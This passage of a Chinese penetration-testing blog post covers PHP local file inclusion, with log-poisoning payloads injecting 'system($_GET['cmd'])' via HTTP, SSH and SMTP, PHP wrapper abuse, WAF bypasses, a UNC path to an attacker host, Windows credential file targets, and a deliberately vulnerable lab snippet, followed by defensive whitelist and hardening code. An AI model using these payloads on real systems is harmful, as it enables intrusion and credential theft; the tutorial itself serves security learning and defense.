+<h3 id="6-1-Apache-访问日志"><a href="#6-1-Apache-访问日志" class="headerlink" title="6.1 Apache 访问日志"></a>6.1 Apache 访问日志</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">nc target.com 80 &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">GET /&lt;?php system(\$_GET[&#x27;cmd&#x27;]); ?&gt; HTTP/1.1</span></span><br><span class="line"><span class="string">Host: target.com</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
+
+<p>payload 写入 <code>/var/log/apache2/access.log</code>，随后：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../var/log/apache2/access.log&amp;cmd=id</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-SSH-认证日志（auth-log）"><a href="#6-2-SSH-认证日志（auth-log）" class="headerlink" title="6.2 SSH 认证日志（auth.log）"></a>6.2 SSH 认证日志（auth.log）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="string">&#x27;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#x27;</span>@target.com</span><br></pre></td></tr></table></figure>
+
+<p>登录失败后，登录名记入 <code>/var/log/auth.log</code>，再通过 LFI 触发：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=../../../var/log/auth.log&amp;cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<h3 id="6-3-邮件日志（mail-log）"><a href="#6-3-邮件日志（mail-log）" class="headerlink" title="6.3 邮件日志（mail.log）"></a>6.3 邮件日志（mail.log）</h3><p>通过 SMTP 发送含 php payload 的邮件头，污染 <code>/var/log/mail.log</code>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HELO &lt;?php system($_GET[0]); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后 <code>?page=../../../var/log/mail.log&amp;0=id</code> 即可执行。</p>
+<h3 id="6-4-污染流程"><a href="#6-4-污染流程" class="headerlink" title="6.4 污染流程"></a>6.4 污染流程</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">发送含 &lt;?php ... ?&gt; 的请求 → payload写入日志 → LFI包含日志 → PHP引擎解析 → 代码执行 → 反弹Shell</span><br></pre></td></tr></table></figure>
+
+<h2 id="七、PHP-封装器（Wrappers）"><a href="#七、PHP-封装器（Wrappers）" class="headerlink" title="七、PHP 封装器（Wrappers）"></a>七、PHP 封装器（Wrappers）</h2><table>
+<thead>
+<tr>
+<th>封装器</th>
+<th>用途</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>php://filter</code></td>
+<td>编码读取</td>
+<td><code>php://filter/convert.base64-encode/resource=config</code></td>
+</tr>
+<tr>
+<td><code>php://input</code></td>
+<td>执行 POST body 中 PHP 代码</td>
+<td><code>php://input</code></td>
+</tr>
+<tr>
+<td><code>data://</code></td>
+<td>内联数据流</td>
+<td><code>data://text/plain,&lt;?php system(&#39;id&#39;);?&gt;</code></td>
+</tr>
+<tr>
+<td><code>expect://</code></td>
+<td>执行命令（需扩展）</td>
+<td><code>expect://id</code></td>
+</tr>
+<tr>
+<td><code>phar://</code> <code>zip://</code></td>
+<td>压缩包内文件</td>
+<td><code>phar://a.zip/b.txt</code> <code>zip://a.zip%23b.txt</code></td>
+</tr>
+</tbody></table>
+<h3 id="php-filter-读源码"><a href="#php-filter-读源码" class="headerlink" title="php:&#x2F;&#x2F;filter 读源码"></a>php:&#x2F;&#x2F;filter 读源码</h3><p>Base64 编码后读取避免 PHP 解析（LFI 最常用信息收集手段）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/convert.base64-encode/resource=../../config</span><br><span class="line"># 解码 Base64 获得 config.php 源码</span><br></pre></td></tr></table></figure>
+
+<p>组合过滤器绕过 WAF：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode|convert.iconv.utf-8.utf-16/resource=index</span><br></pre></td></tr></table></figure>
+
+<h2 id="八、Windows-LFI-特殊技巧"><a href="#八、Windows-LFI-特殊技巧" class="headerlink" title="八、Windows LFI 特殊技巧"></a>八、Windows LFI 特殊技巧</h2><p>PHP 在 Windows 上兼容正反斜杠，以下路径可等效：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\win.ini    C:/Windows/win.ini    /Windows/win.ini</span><br><span class="line">..\..\..\Windows\win.ini    ../../../Windows/win.ini</span><br></pre></td></tr></table></figure>
+
+<p>UNC 路径在部分配置下可被包含：<code>//&lt;attacker-ip&gt;/share/shell.php</code></p>
+<p>关键 Windows 目标：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc\hosts    ← 内网信息</span><br><span class="line">C:\Windows\repair\SAM                     ← SAM 备份</span><br><span class="line">C:\xampp\phpMyAdmin\config.inc.php        ← 数据库凭据</span><br><span class="line">C:\Program Files\MySQL\my.ini             ← MySQL 密码</span><br></pre></td></tr></table></figure>
+
+<h2 id="九、防御措施"><a href="#九、防御措施" class="headerlink" title="九、防御措施"></a>九、防御措施</h2><h3 id="9-1-白名单机制（推荐）"><a href="#9-1-白名单机制（推荐）" class="headerlink" title="9.1 白名单机制（推荐）"></a>9.1 白名单机制（推荐）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$allowed</span> = [<span class="string">&#x27;home&#x27;</span>, <span class="string">&#x27;about&#x27;</span>, <span class="string">&#x27;contact&#x27;</span>];</span><br><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>, <span class="variable">$allowed</span>, <span class="literal">true</span>)</span><br><span class="line">        ? <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] : <span class="string">&#x27;404&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;pages/<span class="subst">&#123;$page&#125;</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>白名单不接收任何未预定义的值，是最彻底的防御。</p>
+<h3 id="9-2-输入过滤与配置加固"><a href="#9-2-输入过滤与配置加固" class="headerlink" title="9.2 输入过滤与配置加固"></a>9.2 输入过滤与配置加固</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">basename</span>(<span class="title function_ invoke__">realpath</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="variable">$page</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_\-]/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;pages/<span class="subst">&#123;$page&#125;</span>.php&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>PHP 配置：<code>allow_url_include = Off</code>、<code>open_basedir</code> 限制目录、<code>disable_functions</code> 禁用 exec&#x2F;system&#x2F;passthru&#x2F;shell_exec&#x2F;popen&#x2F;proc_open。系统层面：Web 进程用低权限账户、敏感文件设最小权限（<code>chmod 000 /etc/shadow</code>）、定期审计日志。</p>
+<h2 id="十、完整攻击流程（Flowchart）"><a href="#十、完整攻击流程（Flowchart）" class="headerlink" title="十、完整攻击流程（Flowchart）"></a>十、完整攻击流程（Flowchart）</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">┌──────────────────────────────────┐</span><br><span class="line">│   发现LFI入口: ?page= ?file= ?lang=   │</span><br><span class="line">└───────────────┬──────────────────┘</span><br><span class="line">                ↓</span><br><span class="line">┌──────────────────────────────────┐</span><br><span class="line">│ 基础测试: ../../../etc/passwd        │</span><br><span class="line">└───────────────┬──────────────────┘</span><br><span class="line">                ↓</span><br><span class="line">        ┌───────┴───────┐</span><br><span class="line">        ↓               ↓</span><br><span class="line">    读取成功          读取失败</span><br><span class="line">        ↓               ↓</span><br><span class="line">  ┌─────────┐    ┌─────────────────┐</span><br><span class="line">  │ 信息收集 │    │ 绕过测试         │</span><br><span class="line">  │ passwd  │    │ URL编码/双重编码  │</span><br><span class="line">  │ version │    │ Null Byte       │</span><br><span class="line">  │ 配置文件 │    │ 交错 ../ 序列    │</span><br><span class="line">  └────┬────┘    │ php://filter   │</span><br><span class="line">       ↓         └────────┬────────┘</span><br><span class="line">  ┌─────────┐             ↓</span><br><span class="line">  │ 日志污染 │        读取成功 → 同上</span><br><span class="line">  │ Access  │</span><br><span class="line">  │ SSH/Mail│</span><br><span class="line">  └────┬────┘</span><br><span class="line">       ↓</span><br><span class="line">  ┌─────────┐</span><br><span class="line">  │  RCE    │</span><br><span class="line">  │ ?cmd=id │</span><br><span class="line">  └────┬────┘</span><br><span class="line">       ↓</span><br><span class="line">  ┌─────────┐</span><br><span class="line">  │反弹Shell│</span><br><span class="line">  │nc/bash  │</span><br><span class="line">  │/dev/tcp │</span><br><span class="line">  └─────────┘</span><br></pre></td></tr></table></figure>
+
+<h2 id="十一、常见误区与注意事项"><a href="#十一、常见误区与注意事项" class="headerlink" title="十一、常见误区与注意事项"></a>十一、常见误区与注意事项</h2><p><strong>误区一：”后缀硬编码能防住”</strong>：并非所有应用都加后缀；后缀可被 Null Byte 截断；PHP 封装器在有后缀时仍可正常工作。</p>
+<p><strong>误区二：”Null Byte 已绝迹”</strong>：PHP &gt;&#x3D; 5.3.4 虽已修复，但遗留系统、老旧CMS、IoT设备仍运行旧版 PHP。Windows 对空字节的处理与 Linux 不同。</p>
+<p><strong>误区三：”Base64 只对 PHP 文件有效”</strong>：<code>php://filter</code> 可对任意文件（含 <code>/etc/passwd</code>）编码输出；WAF 可能仅拦截直接路径穿越而未覆盖封装器变体。</p>
+<p><strong>实战略注意事项</strong>：</p>
+<ul>
+<li>日志路径：Debian&#x2F;Ubuntu 为 <code>/var/log/apache2/</code>，RHEL&#x2F;CentOS 为 <code>/var/log/httpd/</code></li>
+<li><code>/proc/self/environ</code> 现常仅 root 可读，容器和旧系统中可能例外</li>
+<li>日志污染痕迹不可擦除，需评估溯源性风险</li>
+<li>若有文件上传功能，结合 <code>/proc/self/fd/</code> 枚举可能突破</li>
+<li>Windows + IIS + PHP 环境中 <code>..\</code> 与 <code>../</code> 混用可导致过滤失效</li>
+</ul>
+<h2 id="十二、实验环境与免责声明"><a href="#十二、实验环境与免责声明" class="headerlink" title="十二、实验环境与免责声明"></a>十二、实验环境与免责声明</h2><p><strong>本地靶场</strong>（仅供学习，严禁部署到生产环境）：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>] ?? <span class="string">&#x27;welcome&#x27;</span>; <span class="keyword">include</span>(<span class="variable">$page</span> . <span class="string">&#x27;.php&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试命令</span></span><br><span class="line">curl <span class="string">&quot;http://localhost/lab.php?page=../../../etc/passwd%00&quot;</span></span><br><span class="line">curl <span class="string">&quot;http://localhost/lab.php?page=php://filter/convert.base64-encode/resource=../../../etc/passwd&quot;</span></span><br><span class="line">curl -H <span class="string">&quot;User-Agent: &lt;?php system(&#x27;id&#x27;);?&gt;&quot;</span> <span class="string">&quot;http://localhost/lab.php?page=/proc/self/environ&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>本文仅供安全研究与学习目的。</strong> 文中所述技术不得用于未经授权的系统测试或攻击行为。使用者应确保仅在获得明确授权的目标上或自建的隔离环境中进行实践。作者对任何滥用文中技术所造成的后果不承担任何责任。渗透测试从业者应遵循 OWASP Testing Guide、PTES 等行业标准，在授权范围内进行安全评估并妥善保护客户数据。</p>
+<hr>
+<p><em>参考资料: OWASP Testing Guide, PortSwigger Web Security Academy, MITRE CWE-98, PHP Manual - Streams &amp; Wrappers</em></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/CMS-Drupal-pentest/" rel="prev" title="Drupal 安全测试实战">
+                  <i class="fa fa-angle-left"></i> Drupal 安全测试实战
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/Cloud-AliCloud-security/" rel="next" title="云安全：阿里云安全测试">
+                  云安全：阿里云安全测试 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
